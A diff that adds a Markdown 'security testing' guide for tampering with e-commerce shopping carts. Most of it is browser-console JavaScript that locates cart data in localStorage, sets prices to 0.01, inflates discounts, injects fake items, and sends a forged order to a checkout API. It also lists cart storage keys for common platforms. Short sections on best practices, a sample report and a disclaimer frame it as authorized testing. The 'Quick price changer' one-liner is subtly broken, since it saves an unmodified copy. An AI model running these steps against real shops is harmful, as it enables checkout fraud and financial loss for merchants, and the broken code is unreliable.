@@ -1,0 +1,297 @@
+# 🔍 Web Security Testing Guide - Price Manipulation & Cart Testing
+
+## Overview
+This guide demonstrates how to test for client-side security vulnerabilities in e-commerce websites. Use this for security testing of your own applications only.
+
+---
+
+## 🎯 Step 1: Find Cart Storage Locations
+
+### Check localStorage for cart data:
+```javascript
+Object.keys(localStorage)
+```
+
+### Check sessionStorage for cart data:
+```javascript
+Object.keys(sessionStorage)
+```
+
+### Look for cart-related keys:
+```javascript
+Object.keys(localStorage).filter(key => key.toLowerCase().includes('cart'))
+Object.keys(sessionStorage).filter(key => key.toLowerCase().includes('cart'))
+```
+
+### Look for other common cart names:
+```javascript
+Object.keys(localStorage).filter(key => 
+  key.toLowerCase().includes('basket') || 
+  key.toLowerCase().includes('shopping') ||
+  key.toLowerCase().includes('order') ||
+  key.toLowerCase().includes('items')
+)
+```
+
+---
+
+## 🎯 Step 2: Analyze Cart Data Structure
+
+### Get cart data:
+```javascript
+JSON.parse(localStorage.getItem('CART_KEY_HERE') || '[]')
+```
+
+### Check data type:
+```javascript
+typeof cartData
+```
+
+### If it's an object, check its keys:
+```javascript
+Object.keys(cartData)
+```
+
+### Pretty print the data:
+```javascript
+JSON.stringify(cartData, null, 2)
+```
+
+---
+
+## 🎯 Step 3: Price Manipulation Methods
+
+### Method A: Direct Price Manipulation (for arrays)
+```javascript
+// Get cart data
+cartData = JSON.parse(localStorage.getItem('CART_KEY_HERE') || '[]')
+
+// Change all prices to 0.01
+cartData.forEach(item => item.price = 0.01)
+
+// Save changes
+localStorage.setItem('CART_KEY_HERE', JSON.stringify(cartData))
+
+// Reload page
+location.reload()
+```
+
+### Method B: Object Property Manipulation
+```javascript
+// For cart objects with price properties
+cartData = JSON.parse(localStorage.getItem('CART_KEY_HERE') || '{}')
+cartData.totalPrice = 0.01
+cartData.subtotal = 0.01
+localStorage.setItem('CART_KEY_HERE', JSON.stringify(cartData))
+location.reload()
+```
+
+### Method C: Reference Manipulation
+```javascript
+// For reference-based cart systems
+cartData = JSON.parse(localStorage.getItem('CART_KEY_HERE') || '{}')
+cartData.active = '0'  // Change cart reference
+cartData.cartId = null  // Clear cart ID
+localStorage.setItem('CART_KEY_HERE', JSON.stringify(cartData))
+location.reload()
+```
+
+---
+
+## 🎯 Step 4: Advanced Manipulation Techniques
+
+### Quantity Manipulation:
+```javascript
+cartData.forEach(item => item.quantity = 999)
+```
+
+### Discount Manipulation:
+```javascript
+cartData.forEach(item => item.discount = 0.99)
+cartData.forEach(item => item.discountPercent = 99)
+```
+
+### Remove Items:
+```javascript
+cartData.length = 0  // Clear array
+// OR
+cartData.items = []  // Clear items property
+```
+
+### Add Fake Items:
+```javascript
+cartData.push({
+  id: 999999,
+  name: "Free Item",
+  price: 0.01,
+  quantity: 1
+})
+```
+
+---
+
+## 🎯 Step 5: Network Request Interception
+
+### Find order/checkout requests:
+1. Open Developer Tools → Network tab
+2. Place an order
+3. Look for POST requests to `/api/order`, `/checkout`, `/cart`
+4. Right-click → "Copy as cURL"
+5. Modify the request data in a new terminal
+
+### Direct API manipulation:
+```javascript
+fetch('/api/order/confirm', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({
+    orderItems: [{
+      id: 123,
+      name: "Manipulated Item",
+      price: 0.01,  // ← Manipulated price
+      quantity: 1
+    }],
+    totalAmount: 0.01  // ← Manipulated total
+  })
+})
+```
+
+---
+
+## 🎯 Step 6: Common Storage Patterns
+
+### React/Next.js apps:
+- `'cart'`, `'shopping-cart'`, `'order-cart'`
+- `'pizza-cart'`, `'food-cart'` (for food apps)
+- `'user-cart'`, `'session-cart'`
+
+### E-commerce platforms:
+- `'woocommerce_cart'`, `'shopify_cart'`
+- `'magento_cart'`, `'prestashop_cart'`
+
+### Custom apps:
+- `'app-name-cart'`, `'company-cart'`
+- `'spartacus⚿site-cart'` (Spartacus framework)
+
+---
+
+## 🎯 Step 7: Testing Checklist
+
+### ✅ What to Test:
+- [ ] Can you change item prices?
+- [ ] Can you modify quantities?
+- [ ] Can you clear the cart?
+- [ ] Can you add fake items?
+- [ ] Can you manipulate totals?
+- [ ] Can you change cart references?
+- [ ] Does the server validate prices?
+- [ ] Does the server reject invalid data?
+
+### ✅ What to Look For:
+- [ ] Price changes persist after reload
+- [ ] Server accepts manipulated prices
+- [ ] No server-side validation
+- [ ] Client-side calculations only
+- [ ] No authentication checks
+- [ ] Insecure storage patterns
+
+---
+
+## 🎯 Step 8: Security Best Practices
+
+### ❌ What NOT to Do (Vulnerabilities):
+- Store prices client-side only
+- Trust client calculations
+- No server validation
+- Insecure cart references
+- Client-side totals only
+
+### ✅ What TO Do (Secure):
+- Server-side price validation
+- Database price fetching
+- Server-side calculations
+- Input validation
+- Authentication checks
+- Secure storage patterns
+
+---
+
+## 🎯 Step 9: Common Commands Reference
+
+### Quick cart finder:
+```javascript
+Object.keys(localStorage).filter(k => k.toLowerCase().includes('cart'))
+```
+
+### Quick price changer:
+```javascript
+(JSON.parse(localStorage.getItem('CART_KEY') || '[]')).forEach(i => i.price = 0.01); localStorage.setItem('CART_KEY', JSON.stringify(JSON.parse(localStorage.getItem('CART_KEY') || '[]'))); location.reload()
+```
+
+### Quick cart clearer:
+```javascript
+localStorage.removeItem('CART_KEY')
+```
+
+### Quick total checker:
+```javascript
+JSON.parse(localStorage.getItem('CART_KEY') || '[]').reduce((sum, item) => sum + (item.price * item.quantity), 0)
+```
+
+---
+
+## 🎯 Step 10: Reporting Vulnerabilities
+
+### Document findings:
+1. **Vulnerability type**: Client-side price manipulation
+2. **Affected components**: Cart, checkout, pricing
+3. **Impact**: Financial loss, order manipulation
+4. **Steps to reproduce**: Detailed steps
+5. **Recommended fixes**: Server-side validation
+
+### Example report:
+```
+SECURITY VULNERABILITY FOUND
+
+Type: Client-side Price Manipulation
+Severity: HIGH
+Impact: Users can manipulate cart prices
+
+Steps to reproduce:
+1. Add items to cart
+2. Open browser console
+3. Run: localStorage.getItem('cart')
+4. Modify prices in returned data
+5. Save and reload page
+6. Proceed to checkout with manipulated prices
+
+Fix: Implement server-side price validation
+```
+
+---
+
+## ⚠️ Legal Disclaimer
+
+This guide is for:
+- ✅ Testing your own applications
+- ✅ Authorized security testing
+- ✅ Educational purposes
+- ✅ Bug bounty programs
+
+NOT for:
+- ❌ Unauthorized testing
+- ❌ Malicious attacks
+- ❌ Illegal activities
+- ❌ Harming other systems
+
+Always ensure you have permission before testing any website or application.
+
+---
+
+## 📝 Notes
+
+- Some sites use reference-based cart systems (more secure)
+- Modern frameworks often have built-in protections
+- Server-side validation is crucial for security
+- Always test on your own applications first
+- Document all findings for development team
